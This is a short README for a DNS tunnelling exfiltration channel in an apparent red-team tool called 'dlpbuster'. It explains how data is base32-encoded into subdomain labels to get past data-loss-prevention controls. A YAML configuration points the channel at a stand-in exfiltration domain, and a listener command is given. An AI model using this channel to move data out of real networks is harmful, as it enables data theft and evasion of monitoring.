# DNS Tunnel Channel

## Overview
Exfiltrates payload by base32-encoding it and sending it as subdomain labels in DNS queries.

## How It Works
1. Payload is base32 encoded (lowercase, no padding)
2. Encoded string is split into 63-byte labels (DNS label length limit)
3. Each label is prepended to the configured exfil domain: `<chunk>.<domain>`
4. Queries are sent via UDP to the configured resolver

## Why It Bypasses DLP
DNS traffic is often overlooked or not inspected by DLP tools. Many organisations allow outbound DNS to untrusted resolvers.

## Configuration
```yaml
channels:
  dns:
    enabled: true
    resolver: "8.8.8.8:53"
    domain: "exfil.your-vps.example.com"
    record_types: ["TXT"]
```

## Requirements
- No root required
- Listener: `dlpbuster serve --dns`

## Limitations
- Bandwidth limited by DNS query rate
- Long payloads generate many queries (detectable by volume)
